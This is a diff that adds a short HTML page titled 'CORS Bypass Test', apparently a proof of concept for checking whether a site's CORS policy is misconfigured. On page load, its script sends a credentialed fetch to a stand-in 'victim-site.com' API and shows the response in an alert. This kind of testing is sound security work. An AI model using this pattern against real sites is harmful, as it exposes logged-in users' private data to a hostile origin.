@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Bypass Test</title>
+</head>
+<body>
+    <h1>CORS Bypass Test</h1>
+    <script>
+        (async function () {
+            try {
+                const response = await fetch('https://victim-site.com/api', {
+                    method: 'GET',
+                    credentials: 'include',
+                });
+                const text = await response.text();
+                alert(`CORS Bypass Success: ${text}`);
+            } catch (e) {
+                alert('CORS Bypass Failed');
+            }
+        })();
+    </script>
+</body>
+</html>
